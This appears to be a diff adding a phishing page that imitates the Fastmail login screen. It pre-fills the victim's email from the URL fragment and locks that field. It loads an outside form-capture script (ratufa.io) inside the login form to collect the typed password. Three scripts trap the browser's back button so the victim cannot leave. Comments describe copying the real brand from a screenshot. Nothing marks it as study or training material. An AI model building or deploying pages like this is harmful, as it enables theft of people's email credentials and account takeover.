@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fastmail - Log in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            /* Exact match of the dark blue diagonal vignette linear gradient background from the screenshot */
+            background: linear-gradient(135deg, #091e3a 0%, #1c4e80 60%, #0d2c52 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 40px;
+            position: relative;
+        }
+
+        /* Top Navigation Header Navbar Area Layout Elements */
+        .navbar {
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        /* Circular multi-color logo symbol replication element */
+        .logo-symbol {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 70% 30%, #ff7600, #ff1f00 40%, #0066ff);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .nav-links a {
+            color: rgba(255, 255, 255, 0.85);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .nav-links a:hover {
+            color: #ffffff;
+        }
+
+        /* Main Workspace Content Form Card Box Layout Area Component */
+        .main-workspace {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            margin: auto;
+        }
+
+        /* White floating card module component precisely tracking original bounds shapes */
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            margin-bottom: 24px;
+        }
+
+        .card-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            color: #333333;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #000000;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-control:focus {
+            border-color: #0066cc;
+        }
+
+        .form-control::placeholder {
+            color: #a0a0a0;
+            opacity: 0.7;
+        }
+
+        /* Extended padding for interactive eye toggle layout parameter option */
+        .form-control.pass-field {
+            padding-right: 40px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 14px;
+            bottom: 12px;
+            color: #777777;
+            cursor: pointer;
+            font-size: 16px;
+            user-select: none;
+        }
+
+        /* Crisp solid blue button tracking original layout blueprint elements precisely */
+        .submit-btn {
+            width: 100%;
+            background-color: #0061c2;
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
+            margin-top: 6px;
+        }
+
+        .submit-btn:hover {
+            background-color: #004b99;
+        }
+
+        /* Bottom helper structural connection recovery tag links */
+        .recovery-link {
+            color: rgba(255, 255, 255, 0.85);
+            font-size: 13px;
+            text-decoration: underline;
+        }
+
+        .recovery-link:hover {
+            color: #ffffff;
+        }
+
+        /* Desktop environment layout decoration system watermark overlay reproduction */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.2);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Ribbon Navbar Line Layer Components Header -->
+    <header class="navbar">
+        <a href="#" class="brand-logo">
+            <div class="logo-symbol"></div>
+            Fastmail
+        </a>
+        <nav class="nav-links">
+            <a href="#">Support</a>
+            <a href="#">Log in</a>
+            <a href="#">Sign up</a>
+        </nav>
+    </header>
+
+    <!-- Center Composition Interactive Area Section -->
+    <main class="main-workspace">
+        <div class="login-card">
+    
+            <h1 class="card-title">Log in</h1>
+            
+            <form action="" method="POST">
+                <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                <div class="form-group">
+                    <label for="email">Username</label>
+                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+
+                <!-- Newly Integrated Structured Secure Password Field Entry Module Section -->
+                <div class="form-group">
+                    <label for="password">Password</label>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                    <span class="password-toggle">👁</span>
+                </div>
+                
+                <button type="submit" class="submit-btn">Continue</button>
+            </form>
+        </div>
+
+        <a href="#" class="recovery-link">Can't access your account?</a>
+    </main>
+
+   
+ <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
